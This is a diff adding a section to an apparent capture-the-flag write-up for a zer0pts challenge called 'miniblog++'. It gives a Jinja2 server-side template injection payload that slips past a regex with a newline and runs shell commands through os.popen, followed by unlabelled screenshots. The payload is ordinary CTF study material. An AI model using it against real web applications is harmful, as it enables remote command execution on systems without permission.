@@ -67,3 +67,21 @@ You can change these values to anything which when craft_url is call, it will cr
 ***Flag: zer0pts{foo/bar/../../../../../directory/traversal}***
 
 # miniblog++
+
+Use `\n` to bypass regex.
+
+Payload:
+
+```
+{{\nlipsum.__globals__['os'].popen('command').read()}}
+```
+
+![image](https://user-images.githubusercontent.com/83667873/159618707-526b397f-dedc-4c46-a360-dfd2de3c6f15.png)
+
+![image](https://user-images.githubusercontent.com/83667873/159618738-6024863b-a2cd-43af-9938-0b12e4395b38.png)
+
+![image](https://user-images.githubusercontent.com/83667873/159618967-4925c734-7ed2-4c02-8648-dd85fa2faa12.png)
+
+
+![image](https://user-images.githubusercontent.com/83667873/159618934-dbc5cc10-aa7c-46eb-ae59-c04d4e75988e.png)
+
